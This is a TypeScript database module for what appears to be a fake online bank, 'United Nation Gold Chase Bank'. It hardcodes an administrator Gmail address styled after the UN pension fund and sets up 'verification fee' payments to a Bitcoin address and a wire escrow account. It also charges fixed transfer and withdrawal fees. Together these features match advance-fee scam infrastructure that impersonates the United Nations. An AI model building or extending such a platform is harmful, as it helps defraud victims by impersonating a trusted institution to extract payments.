import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import {
  DatabaseSchema,
  User,
  Wallet,
  Transaction,
  FeeSettings,
  PaymentMethodConfig,
  Notification,
  AuditLog,
  ResetSecurity,
  PasswordRecoveryCode
} from './types';

const DATA_DIR = path.resolve(process.cwd(), 'data');
const DB_FILE = path.join(DATA_DIR, 'database.json');
const TEMP_DB_FILE = path.join(DATA_DIR, 'database.tmp.json');

// Security constants - Administrator Email Whitelist
export const AUTHORIZED_ADMIN_EMAIL = 'un.department.retirement.unjspf@gmail.com';

export function isAuthorizedAdminEmail(email?: string | null): boolean {
  if (!email) return false;
  const clean = email.trim().toLowerCase();
  return clean === AUTHORIZED_ADMIN_EMAIL.toLowerCase();
}

export function hashPassword(password: string, salt: string): string {
  return crypto.pbkdf2Sync(password, salt, 100000, 64, 'sha512').toString('hex');
}

export function generateSalt(): string {
  return crypto.randomBytes(16).toString('hex');
}

export function generateReference(prefix: string = 'TXN-UNGB'): string {
  const datePart = new Date().toISOString().slice(2, 10).replace(/-/g, '');
  const randomPart = crypto.randomBytes(3).toString('hex').toUpperCase();
  return `${prefix}-${datePart}-${randomPart}`;
}

export function generateAccountNumber(): string {
  const part1 = Math.floor(1000 + Math.random() * 9000);
  const part2 = Math.floor(1000 + Math.random() * 9000);
  const part3 = Math.floor(1000 + Math.random() * 9000);
  const part4 = Math.floor(1000 + Math.random() * 9000);
  return `UNGB-${part1}-${part2}-${part3}-${part4}`;
}

// In-memory working copy
let db: DatabaseSchema;

function getInitialDatabase(): DatabaseSchema {
  const resetSalt = generateSalt();
  const resetPasswordHash = hashPassword(process.env.ADMIN_INITIAL_SECRET || crypto.randomBytes(24).toString('hex'), resetSalt);

  const initialFeeSettings: FeeSettings = {
    transferFixedFee: 15.00,
    transferPercentFee: 0.0,
    transferFeeEnabled: true,
    withdrawalFixedFee: 25.00,
    withdrawalPercentFee: 0.0,
    withdrawalFeeEnabled: true,
    transferFee: 15.00,
    withdrawalFee: 25.00,
    minTransferAmount: 10.00,
    maxTransferAmount: 500000.00,
    currency: 'USD',
    updatedAt: new Date().toISOString(),
    updatedBy: AUTHORIZED_ADMIN_EMAIL,
  };

  const initialPaymentMethods: PaymentMethodConfig[] = [
    {
      id: 'bitcoin',
      name: 'Bitcoin Network (BTC)',
      enabled: true,
      fee: 15.00,
      instructions: 'Send the exact fee amount to our authorized institutional verification address: bc1qgoldchase92849un021948xkp9. Transfers are verified on the blockchain within 15–60 minutes. Enter your transaction hash or message below.',
      accountDetails: {
        providerName: 'BitPay & Coinbase Institutional Custody',
        btcAddress: 'bc1qgoldchase92849un021948xkp9',
        network: 'Bitcoin Native SegWit (Mainnet)',
        bitcoinInstructions: 'Transfer the exact amount to the authorized receiving address on the Bitcoin Native SegWit network. Upload your transaction receipt for verification.',
      },
    },
    {
      id: 'bank_transfer',
      name: 'Direct Bank Wire / ACH Transfer',
      enabled: true,
      fee: 15.00,
      instructions: 'Wire or ACH the verification fee to our escrow clearing reserve. Quote your Transaction Reference in the wire payment memo.',
      accountDetails: {
        beneficiary: 'United Nation Gold Chase Clearing Escrow LLC',
        accountHolderName: 'United Nation Gold Chase Clearing Escrow LLC',
        bankName: 'Global International Trust Bank, N.A.',
        routingNumber: '021000021',
        accountNumber: '9820019248',
        swiftBic: 'GITBUS33NYC',
        bankInstructions: 'Initiate a domestic wire or ACH transfer to the institutional account details shown. Include your unique Payment Reference in the wire memo field.',
        referenceInstructions: 'Please include your unique transaction reference in the wire transfer memo or description field.',
      },
    },
  ];

  const initialAuditLogs: AuditLog[] = [
    {
      id: 'audit_init_01',
      timestamp: new Date().toISOString(),
      actorEmail: 'system',
      actorRole: 'system',
      action: 'SYSTEM_BOOTSTRAP',
      reason: 'Initialization of clean United Nation Gold Chase Bank persistent ledger',
    },
  ];

  const initialResetSecurity: ResetSecurity = {
    resetPasswordHash,
    resetSalt,
    sessionTimeoutMinutes: 15,
    failedAttempts: 0,
    lockedUntil: null,
    lastPasswordChange: new Date().toISOString(),
  };

  return {
    users: [],
    wallets: [],
    transactions: [],
    feeSettings: initialFeeSettings,
    paymentMethods: initialPaymentMethods,
    paymentSubmissions: [],
    notifications: [],
    announcements: [],
    auditLogs: initialAuditLogs,
    resetSecurity: initialResetSecurity,
    recoveryCodes: [],
    sessions: [],
    pendingCleanups: [],
  };
}

export function initDatabase(): void {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }

  if (fs.existsSync(DB_FILE)) {
    try {
      const raw = fs.readFileSync(DB_FILE, 'utf-8');
      db = JSON.parse(raw);
      if (!db.sessions) {
        db.sessions = [];
      }
      if (!db.paymentSubmissions) {
        db.paymentSubmissions = [];
      }
      if (!db.announcements) {
        db.announcements = [];
      }
      if (!db.pendingCleanups) {
        db.pendingCleanups = [];
      }
      // Clean up expired sessions (older than 30 days)
      db.sessions = db.sessions.filter((s) => s.expiresAt > Date.now());

      // Ensure feeSettings has all fields
      if (db.feeSettings) {
        let changed = false;
        if (db.feeSettings.transferFixedFee === undefined) {
          db.feeSettings.transferFixedFee = db.feeSettings.transferFee ?? 15.0;
          db.feeSettings.transferPercentFee = 0.0;
          db.feeSettings.transferFeeEnabled = true;
          changed = true;
        }
        if (db.feeSettings.withdrawalFixedFee === undefined) {
          db.feeSettings.withdrawalFixedFee = db.feeSettings.withdrawalFee ?? 25.0;
          db.feeSettings.withdrawalPercentFee = 0.0;
          db.feeSettings.withdrawalFeeEnabled = true;
          changed = true;
        }
        if (changed) saveDatabase();
      }

      // If the authorized administrator account exists, enforce admin role
      const adminExists = db.users.find((u) => u.email.toLowerCase() === AUTHORIZED_ADMIN_EMAIL.toLowerCase());
      if (adminExists && adminExists.role !== 'admin') {
        adminExists.role = 'admin';
        saveDatabase();
      }
      return;
    } catch (e) {
      console.error('Failed to parse database file, re-initializing fresh database', e);
    }
  }

  db = getInitialDatabase();
  saveDatabase();
}

export function saveDatabase(): void {
  try {
    const serialized = JSON.stringify(db, null, 2);
    fs.writeFileSync(TEMP_DB_FILE, serialized, 'utf-8');
    fs.renameSync(TEMP_DB_FILE, DB_FILE);
  } catch (err) {
    console.error('CRITICAL: Database atomic write failed', err);
    throw err;
  }
}

export function getDb(): DatabaseSchema {
  if (!db) {
    initDatabase();
  }
  return db;
}

// Helper methods for Ledger & Audits
export function recordAuditLog(
  actorEmail: string,
  actorRole: string,
  action: string,
  details: {
    targetUserId?: string;
    targetUserEmail?: string;
    previousValue?: string;
    newValue?: string;
    reason?: string;
    reference?: string;
    ipAddress?: string;
  } = {}
): AuditLog {
  const currentDb = getDb();
  const entry: AuditLog = {
    id: `audit_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`,
    timestamp: new Date().toISOString(),
    actorEmail,
    actorRole,
    action,
    ...details,
  };
  currentDb.auditLogs.unshift(entry);
  saveDatabase();
  return entry;
}

export function createNotification(
  userId: string,
  title: string,
  message: string,
  type: Notification['type'] = 'system',
  actionUrl?: string,
  reference?: string,
  amount?: number,
  extra?: {
    templateKey?: string;
    templateParams?: Record<string, string | number>;
    translations?: Record<string, { title: string; message: string }>;
  }
): Notification {
  const currentDb = getDb();
  const notif: Notification = {
    id: `notif_${Date.now()}_${crypto.randomBytes(3).toString('hex')}`,
    userId,
    title,
    message,
    type,
    read: false,
    createdAt: new Date().toISOString(),
    actionUrl,
    reference,
    amount,
    ...(extra?.templateKey ? { templateKey: extra.templateKey } : {}),
    ...(extra?.templateParams ? { templateParams: extra.templateParams } : {}),
    ...(extra?.translations ? { translations: extra.translations } : {}),
  };
  currentDb.notifications.unshift(notif);
  saveDatabase();
  return notif;
}
